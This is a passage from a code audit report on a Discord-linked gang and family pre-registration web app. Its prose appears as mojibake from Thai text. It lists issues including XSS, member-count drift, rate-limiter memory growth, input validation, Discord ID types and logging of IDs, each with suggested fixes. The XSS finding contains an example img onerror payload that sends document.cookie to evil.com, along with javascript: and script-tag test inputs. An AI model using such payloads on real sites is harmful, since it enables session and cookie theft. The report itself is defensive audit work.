**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢ / XSS

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü† **‡∏™‡∏π‡∏á**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå:**
```
‡∏ú‡∏π‡πâ‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏ï‡∏±‡πâ‡∏á logo_url ‡πÄ‡∏õ‡πá‡∏ô:
javascript:alert('XSS')

‡∏´‡∏£‡∏∑‡∏≠‡∏ï‡∏±‡πâ‡∏á motd ‡πÄ‡∏õ‡πá‡∏ô:
<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏ (‡πÇ‡∏Ñ‡πâ‡∏î):**
```jsx
// GangManager.js ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 483-486
{gang.logo_url ? (
    <img
        src={gang.logo_url}  // ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö!
        alt={gang.name}
        ...
    />
) : (...)}

// motd ‡πÅ‡∏™‡∏î‡∏á‡∏ï‡∏£‡∏á‡πÜ
<div className="...">{gang.motd}</div> // ‡∏≠‡∏≤‡∏à‡∏°‡∏µ HTML
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏Ç‡πÇ‡∏°‡∏¢ Session
- ‡∏Ç‡πÇ‡∏°‡∏¢ Cookie
- Redirect ‡πÑ‡∏õ‡πÑ‡∏ã‡∏ï‡πå‡∏≠‡∏±‡∏ô‡∏ï‡∏£‡∏≤‡∏¢

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// 1. ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö URL ‡∏ö‡∏ô server (gang/route.js)
function isValidImageUrl(url) {
    if (!url) return true;
    try {
        const parsed = new URL(url);
        const allowedDomains = ['pic.in.th', 'i.imgur.com', 'imgbb.com', 'cdn.discordapp.com'];
        return allowedDomains.some(domain => parsed.hostname.endsWith(domain));
    } catch {
        return false;
    }
}

// 2. Sanitize motd ‡∏ö‡∏ô client
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(gang.motd || '') }} />

// ‡∏´‡∏£‡∏∑‡∏≠‡πÉ‡∏ä‡πâ‡πÅ‡∏Ñ‡πà plain text:
<div>{gang.motd}</div> // React ‡∏à‡∏∞ escape ‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #6: member_count ‡∏≠‡∏≤‡∏à‡πÑ‡∏°‡πà‡∏ï‡∏£‡∏á‡∏Å‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏£‡∏¥‡∏á

**‡πÑ‡∏ü‡∏•‡πå:** `app/api/gang/route.js`, Database Schema

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå‡∏Ç‡∏≠‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏ï‡∏£‡∏£‡∏Å‡∏∞

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü† **‡∏™‡∏π‡∏á**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå (5,000 ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ):**
```
1. ‡πÅ‡∏Å‡πä‡∏á‡∏°‡∏µ 10 ‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å, member_count = 10
2. ‡∏Ñ‡∏ô A ‡∏≠‡∏≠‡∏Å (member_count = 9)
3. Network error - connection.commit() ‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß
4. gang_id ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏ô A ‡∏¢‡∏±‡∏á‡∏≠‡∏¢‡∏π‡πà (rollback ‡πÑ‡∏°‡πà‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå)
5. member_count = 9 ‡πÅ‡∏ï‡πà‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡∏à‡∏£‡∏¥‡∏á = 10
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏:**
```javascript
// ‡πÄ‡∏Å‡πá‡∏ö count ‡πÅ‡∏¢‡∏Å‡πÅ‡∏ó‡∏ô‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏ô‡∏±‡∏ö‡∏à‡∏≤‡∏Å‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡∏à‡∏£‡∏¥‡∏á
// gangs.member_count ‡∏≠‡∏≤‡∏à‡πÑ‡∏°‡πà‡∏ï‡∏£‡∏á‡∏Å‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏õ‡πá‡∏ô‡∏à‡∏£‡∏¥‡∏á
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÅ‡∏°‡πâ‡πÅ‡∏Å‡πä‡∏á‡πÑ‡∏°‡πà‡πÄ‡∏ï‡πá‡∏°‡∏à‡∏£‡∏¥‡∏á
- ‡∏ô‡∏±‡∏ö‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡∏ú‡∏µ

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡∏ß‡∏¥‡∏ò‡∏µ‡∏ó‡∏µ‡πà 1: ‡∏ô‡∏±‡∏ö‡∏à‡∏≤‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡πÄ‡∏™‡∏°‡∏≠
const [countResult] = await pool.query(
    'SELECT COUNT(*) as count FROM preregistrations WHERE gang_id = ?',
    [gangId]
);
const actualCount = countResult[0].count;

// ‡∏ß‡∏¥‡∏ò‡∏µ‡∏ó‡∏µ‡πà 2: ‡πÉ‡∏ä‡πâ database trigger (‡∏°‡∏µ stored procedure ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß)
// ‡πÄ‡∏£‡∏µ‡∏¢‡∏Å sp_update_gang_member_count ‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏∏‡∏Å‡∏Å‡∏≤‡∏£‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÅ‡∏õ‡∏•‡∏á

// ‡∏ß‡∏¥‡∏ò‡∏µ‡∏ó‡∏µ‡πà 3: ‡∏á‡∏≤‡∏ô sync ‡πÄ‡∏õ‡πá‡∏ô‡∏£‡∏∞‡∏¢‡∏∞
// cron: UPDATE gangs g SET member_count = (SELECT COUNT(*) FROM preregistrations WHERE gang_id = g.id);
```

---

### üü° ‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á / P2 - ‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏°‡∏µ

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #7: Rate Limiter ‡∏£‡∏±‡πà‡∏ß‡∏´‡∏ô‡πà‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥

**‡πÑ‡∏ü‡∏•‡πå:** `lib/rate-limit.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 21-24)

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û / ‡∏´‡∏ô‡πà‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü° **‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå (5,000 ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ):**
```
10,000 IP ‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏ã‡πâ‡∏≥‡∏Å‡∏±‡∏ô‡πÄ‡∏Ç‡πâ‡∏≤‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå
rateLimitMap ‡πÇ‡∏ï‡πÄ‡∏õ‡πá‡∏ô 10,000 entries
‡∏´‡∏ô‡πà‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡∏∂‡πâ‡∏ô‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏¢‡πÜ
‡∏•‡πâ‡∏≤‡∏á‡πÄ‡∏°‡∏∑‡πà‡∏≠ > 10,000 (‡∏î‡πâ‡∏ß‡∏¢ .clear() ‡∏ó‡∏µ‡πà‡∏•‡∏ö‡∏ó‡∏∏‡∏Å‡∏≠‡∏¢‡πà‡∏≤‡∏á)
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏:**
```javascript
// ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 21-24: ‡∏Å‡∏≤‡∏£‡∏•‡πâ‡∏≤‡∏á‡πÅ‡∏ö‡∏ö‡∏á‡πà‡∏≤‡∏¢‡πÜ
if (rateLimitMap.size > 10000) {
    rateLimitMap.clear(); // ‡∏•‡πâ‡∏≤‡∏á‡∏ó‡∏∏‡∏Å‡∏≠‡∏¢‡πà‡∏≤‡∏á ‡∏£‡∏ß‡∏°‡∏ñ‡∏∂‡∏á entries ‡∏ó‡∏µ‡πà‡∏¢‡∏±‡∏á‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ
}
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏´‡∏ô‡πà‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥‡πÇ‡∏ï‡∏Ç‡∏∂‡πâ‡∏ô‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏¢‡πÜ
- Rate limit ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏ñ‡∏π‡∏Å‡∏£‡∏µ‡πÄ‡∏ã‡πá‡∏ï‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Å‡∏±‡∏ô (‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ)

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡∏•‡πâ‡∏≤‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏â‡∏•‡∏≤‡∏î: ‡∏•‡∏ö‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏ó‡∏µ‡πà‡∏´‡∏°‡∏î‡∏≠‡∏≤‡∏¢‡∏∏
function cleanupExpiredEntries(windowMs) {
    const cutoff = Date.now() - windowMs;
    for (const [ip, timestamps] of rateLimitMap.entries()) {
        const valid = timestamps.filter(t => t > cutoff);
        if (valid.length === 0) {
            rateLimitMap.delete(ip);
        } else {
            rateLimitMap.set(ip, valid);
        }
    }
}

// ‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡πÄ‡∏õ‡πá‡∏ô‡∏£‡∏∞‡∏¢‡∏∞ (‡πÄ‡∏ä‡πà‡∏ô ‡∏ó‡∏∏‡∏Å 5 ‡∏ô‡∏≤‡∏ó‡∏µ)
setInterval(() => cleanupExpiredEntries(60000), 300000);
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #8: ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Input ‡πÑ‡∏°‡πà‡∏Ñ‡∏£‡∏ö - ‡∏ä‡∏∑‡πà‡∏≠‡πÅ‡∏Å‡πä‡∏á/‡∏Ñ‡∏£‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡∏ß

**‡πÑ‡∏ü‡∏•‡πå:** `app/api/gang/route.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 73)

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Input

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏ï‡∏£‡∏£‡∏Å‡∏∞ / UX

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü° **‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå:**
```
‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏Å‡πä‡∏á‡∏ä‡∏∑‡πà‡∏≠: "    " (‡∏ä‡πà‡∏≠‡∏á‡∏ß‡πà‡∏≤‡∏á‡πÄ‡∏â‡∏¢‡πÜ) ‚Üí ‡∏ú‡πà‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡πá‡∏Ñ (4 ‡∏ï‡∏±‡∏ß)
‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏Å‡πä‡∏á‡∏ä‡∏∑‡πà‡∏≠: "<script>alert(1)</script>" ‚Üí 27 ‡∏ï‡∏±‡∏ß, ‡∏ú‡πà‡∏≤‡∏ô
‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏Å‡πä‡∏á‡∏ä‡∏∑‡πà‡∏≠: ‡∏ä‡∏∑‡πà‡∏≠‡∏¢‡∏≤‡∏ß‡∏°‡∏≤‡∏Å‡πÜ 200 ‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£... ‚Üí ‡∏ú‡πà‡∏≤‡∏ô
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏:**
```javascript
// ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 73: ‡πÄ‡∏ä‡πá‡∏Ñ‡πÅ‡∏Ñ‡πà‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß >= 3
if (!name || name.length < 3) throw new Error('Gang name too short');
// ‡πÑ‡∏°‡πà‡∏°‡∏µ‡πÄ‡∏ä‡πá‡∏Ñ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î
// ‡πÑ‡∏°‡πà‡∏°‡∏µ‡πÄ‡∏ä‡πá‡∏Ñ‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£
// ‡πÑ‡∏°‡πà‡∏°‡∏µ trim()
```

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ó‡∏µ‡πà‡∏Ñ‡∏£‡∏ö‡∏ñ‡πâ‡∏ß‡∏ô
const trimmedName = name?.trim();
if (!trimmedName) throw new Error('‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡∏ä‡∏∑‡πà‡∏≠‡πÅ‡∏Å‡πä‡∏á');
if (trimmedName.length < 3) throw new Error('‡∏ä‡∏∑‡πà‡∏≠‡πÅ‡∏Å‡πä‡∏á‡∏ï‡πâ‡∏≠‡∏á‡∏°‡∏µ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ô‡πâ‡∏≠‡∏¢ 3 ‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£');
if (trimmedName.length > 20) throw new Error('‡∏ä‡∏∑‡πà‡∏≠‡πÅ‡∏Å‡πä‡∏á‡∏ï‡πâ‡∏≠‡∏á‡πÑ‡∏°‡πà‡πÄ‡∏Å‡∏¥‡∏ô 20 ‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£');
if (!/^[a-zA-Z0-9\s\u0E00-\u0E7F]+$/.test(trimmedName)) {
    throw new Error('‡∏ä‡∏∑‡πà‡∏≠‡πÅ‡∏Å‡πä‡∏á‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£ ‡∏ï‡∏±‡∏ß‡πÄ‡∏•‡∏Ç ‡πÅ‡∏•‡∏∞‡∏†‡∏≤‡∏©‡∏≤‡πÑ‡∏ó‡∏¢');
}
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #9: Discord ID ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡πÑ‡∏°‡πà‡∏™‡∏≠‡∏î‡∏Ñ‡∏•‡πâ‡∏≠‡∏á

**‡πÑ‡∏ü‡∏•‡πå:** ‡∏´‡∏•‡∏≤‡∏¢‡πÑ‡∏ü‡∏•‡πå

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå‡∏Ç‡∏≠‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü° **‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå:**
```
Discord IDs ‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏•‡∏Ç 18 ‡∏´‡∏•‡∏±‡∏Å ‡πÄ‡∏ä‡πà‡∏ô "793410711396024370"
JavaScript Number.MAX_SAFE_INTEGER = 9007199254740991 (16 ‡∏´‡∏•‡∏±‡∏Å)
‡∏Å‡∏≤‡∏£‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£ BigInt ‡πÑ‡∏°‡πà‡∏™‡∏≠‡∏î‡∏Ñ‡∏•‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡πÉ‡∏ô‡πÇ‡∏Ñ‡πâ‡∏î
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏:**
```javascript
// ‡∏ö‡∏≤‡∏á‡∏ó‡∏µ‡πà‡πÅ‡∏õ‡∏•‡∏á‡πÄ‡∏õ‡πá‡∏ô String ‡∏ä‡∏±‡∏î‡πÄ‡∏à‡∏ô
targetDiscordId = String(targetDiscordId);

// ‡∏ö‡∏≤‡∏á‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡πÅ‡∏õ‡∏•‡∏á
if (gang[0].leader_discord_id !== discordId) { ... }

// Database ‡πÉ‡∏ä‡πâ VARCHAR(50) ‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á‡πÅ‡∏•‡πâ‡∏ß
// ‡πÅ‡∏ï‡πà‡∏Å‡∏≤‡∏£‡πÄ‡∏õ‡∏£‡∏µ‡∏¢‡∏ö‡πÄ‡∏ó‡∏µ‡∏¢‡∏ö‡πÉ‡∏ô JavaScript ‡∏≠‡∏≤‡∏à‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß‡∏Å‡∏±‡∏ö BigInt
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Leader ‡∏≠‡∏≤‡∏à‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß
- ‡∏Å‡∏≤‡∏£‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡∏≠‡∏≤‡∏à‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß
- ‡∏û‡∏§‡∏ï‡∏¥‡∏Å‡∏£‡∏£‡∏°‡πÑ‡∏°‡πà‡∏™‡∏°‡πà‡∏≥‡πÄ‡∏™‡∏°‡∏≠

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡πÄ‡∏õ‡∏£‡∏µ‡∏¢‡∏ö‡πÄ‡∏ó‡∏µ‡∏¢‡∏ö‡πÄ‡∏õ‡πá‡∏ô string ‡πÄ‡∏™‡∏°‡∏≠
const discordId = String(session.user.id);

// ‡πÉ‡∏ô database queries ‡πÉ‡∏´‡πâ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏™‡∏≠‡∏î‡∏Ñ‡∏•‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô
'SELECT ... WHERE discord_id = CAST(? AS CHAR)'
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #10: ‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ú‡∏¢‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡πà‡∏≠‡∏ô‡πÑ‡∏´‡∏ß‡πÉ‡∏ô Console Logs

**‡πÑ‡∏ü‡∏•‡πå:** ‡∏´‡∏•‡∏≤‡∏¢ API routes

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢ / Logging

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü° **‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á**

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏:**
```javascript
// gang/route.js ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 134, 220, 252
console.log(`[Gang] Join Request: User=${discordId}, Code=${inviteCode}`);
console.log(`[Gang] Kicking member: Leader=${discordId}, Target=${targetDiscordId}`);
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- Discord IDs ‡∏õ‡∏£‡∏≤‡∏Å‡∏è‡πÉ‡∏ô server logs
- ‡∏£‡∏´‡∏±‡∏™‡πÄ‡∏ä‡∏¥‡∏ç‡∏õ‡∏£‡∏≤‡∏Å‡∏è‡πÉ‡∏ô logs
- ‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ GDPR/‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏õ‡πá‡∏ô‡∏™‡πà‡∏ß‡∏ô‡∏ï‡∏±‡∏ß

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡πÉ‡∏ä‡πâ logging ‡∏ï‡∏≤‡∏° environment
if (process.env.NODE_ENV === 'development') {
    console.log(`[Gang] Join Request: User=${discordId.slice(-4)}, Code=${inviteCode}`);
}

// ‡∏´‡∏£‡∏∑‡∏≠‡πÉ‡∏ä‡πâ logging library ‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏°‡∏≤‡∏∞‡∏™‡∏°
import logger from '@/lib/logger';
logger.debug('Gang join', { userId: discordId.slice(-4) });
```

---

## üìã ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥ ‡∏ï‡∏≤‡∏°‡∏•‡∏≥‡∏î‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç

### P0 - ‡∏ï‡πâ‡∏≠‡∏á‡πÅ‡∏Å‡πâ‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô üî¥

| # | ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ | ‡πÑ‡∏ü‡∏•‡πå | ‡πÄ‡∏ß‡∏•‡∏≤ |
|---|-------|------|------|
| 1 | Race condition ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÅ‡∏Å‡πä‡∏á/‡∏Ñ‡∏£‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡∏ß | `gang/route.js`, `family/route.js` | 2 ‡∏ä‡∏°. |
| 2 | ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏£‡∏´‡∏±‡∏™‡πÅ‡∏Å‡πä‡∏á‡∏ã‡πâ‡∏≥ | `gang/route.js` | 1 ‡∏ä‡∏°. |
| 3 | ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ referral ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î (‡∏à‡∏≥‡∏Å‡∏±‡∏î IP) | `preregister/route.js` | 2 ‡∏ä‡∏°. |

### P1 - ‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏´‡∏•‡∏±‡∏á‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô üü†

| # | ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ | ‡πÑ‡∏ü‡∏•‡πå | ‡πÄ‡∏ß‡∏•‡∏≤ |
|---|-------|------|------|
| 4 | ‡πÄ‡∏û‡∏¥‡πà‡∏° rate limiting ‡πÉ‡∏ô gang/family APIs | `gang/route.js`, `family/route.js` | 1 ‡∏ä‡∏°. |
| 5 | ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô XSS ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö logo_url ‡πÅ‡∏•‡∏∞ motd | `GangManager.js`, API routes | 2 ‡∏ä‡∏°. |
| 6 | ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£ sync member_count | API routes + cron job | 2 ‡∏ä‡∏°. |

### P2 - ‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏°‡∏µ üü°

| # | ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ | ‡πÑ‡∏ü‡∏•‡πå | ‡πÄ‡∏ß‡∏•‡∏≤ |
|---|-------|------|------|
| 7 | ‡∏õ‡∏£‡∏±‡∏ö‡∏õ‡∏£‡∏∏‡∏á‡∏´‡∏ô‡πà‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥‡∏Ç‡∏≠‡∏á rate limiter | `rate-limit.js` | 1 ‡∏ä‡∏°. |
| 8 | ‡∏õ‡∏£‡∏±‡∏ö‡∏õ‡∏£‡∏∏‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö input | API routes | 1 ‡∏ä‡∏°. |
